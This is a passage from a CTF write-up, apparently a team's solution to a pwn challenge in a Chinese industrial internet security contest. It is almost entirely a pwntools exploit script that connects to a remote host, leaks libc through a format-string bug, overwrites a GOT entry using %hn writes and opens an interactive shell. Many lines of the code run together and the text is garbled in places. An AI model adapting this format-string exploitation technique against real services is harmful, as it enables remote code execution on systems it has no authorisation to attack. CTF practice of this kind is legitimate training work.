# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/中国工业互联网安全大赛北京市预选赛-Polaris战队_WP.md
# TITLE: 中国工业互联网安全大赛北京市预选赛-Polaris战队 WP
# CATEGORY: pwn

from pwn import *# r = process('./pwn1')r = remote("39.105.99.40",16018)e = ELF('./pwn1')libc = e.libccontext.terminal = ['tmux', 'splitw', '-h']context.log_level = 'debug'
se = lambda data :r.send(data) sa = lambda delim,data :r.sendafter(delim, data)sl = lambda data :r.sendline(data)sla = lambda delim,data :r.sendlineafter(delim, data)sea = lambda delim,data :r.sendafter(delim, data)rc = lambda numb=4096 :r.recv(numb)rl = lambda :r.recvline()ru = lambda delims :r.recvuntil(delims)uu32 = lambda data :
u32(ru(data)[-4:].ljust(4, b''))uu64 = lambda data :
u64(ru(data)[-6:].ljust(8, b''))info_base = lambda tag, base :r.info(tag + ': {:#x}'.format(base))leak = lambda name,base :
log.success('{} = {:#x}'.format(name, base))
def dbg(cmd): gdb.attach(r,cmd)
ru(b'HELLO?PWN IT!!!n')sl(b"%9$p")
got = 0x403390
og = [0x45226,0x4527a,0xf03a4,0xf1247]libc_base = int(rc(14),16)-0x20840leak("libc_base",libc_base)sys = libc_base + libc.sym['system']offest1 = sys & 0xffff offest3 = sys & 0xffffffoffest2 = int(offest3/0x10000)shell = libc_base + og[0]pl1 = '%13200c%6$hn%4194306c%17$n' sl(pl1.encode())
leak('sys',sys)leak("shell",shell)#36 8ru(b'HELLO?PWN IT!!!n')pl2 = "%" + "{}c".format(offest2) + "%36$hhn"pl2 += "%" + "{}c".format(offest1-offest2) + "%8$hn"sl(pl2.encode())
# dbg('')
r.interactive()```
